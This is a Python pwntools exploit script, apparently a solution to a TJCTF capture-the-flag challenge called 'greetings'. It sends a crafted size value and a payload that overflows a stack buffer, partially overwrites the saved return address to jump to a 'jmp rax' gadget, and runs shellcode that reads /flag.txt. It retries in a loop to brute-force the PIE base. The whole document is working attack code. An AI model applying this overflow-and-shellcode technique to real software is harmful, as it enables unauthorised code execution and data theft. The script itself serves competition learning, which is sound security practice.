#!/usr/bin/env python3
from pwn import *
import time

PORT = 31373
HOST = "tjc.tf"

elf = context.binary = ELF('./greetings_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

context.log_level = 'error'

OFFSET = 0x48

# gadget:
#   0x10df: jmp rax
# We only overwrite the lowest byte of saved RIP to 0xdf.
# fgets() appends a NUL byte after it, so this works when PIE base low16 == 0xf000.
JMP_RAX_LOW_BYTE = b'\xdf'

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript="""
            b *greetUser+0x5a
            b *greetUser+0x66
            c
            set follow-fork-mode parent
            """)

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process([ld.path, "--library-path", ".", elf.path])

def build_shellcode():
    path = "/flag.txt" if args.REMOTE else "flag.txt"
    shellcode = asm(shellcraft.cat(path))
    return shellcode

def build_payload():
    shellcode = build_shellcode()
    payload = flat(
        shellcode,
        b'A' * (OFFSET - len(shellcode)),
        JMP_RAX_LOW_BYTE,
    )
    assert len(payload) == OFFSET + 1
    return payload

def try_once():
    global p
    try:
        p = conn()
    except PwnlibException:
        time.sleep(0.25)
        return None

    payload = build_payload()

    # In source: uname_size += 2; fgets reads at most uname_size - 1 bytes.
    # Want fgets to read exactly len(payload), then append NUL onto saved RIP byte #1.
    size_input = len(payload) - 1

    p.sendline(str(size_input).encode())
    p.sendline(payload)

    try:
        data = p.recvrepeat(0.5)
        if b"tjctf{" in data:
            log.success("flag read")
            print(data.decode(errors="ignore"))
            return p
    except EOFError:
        pass

    p.close()
    time.sleep(0.05)
    return None

# GDB()

while True:
    sh = try_once()
    if sh is not None:
        sh.close()
        break
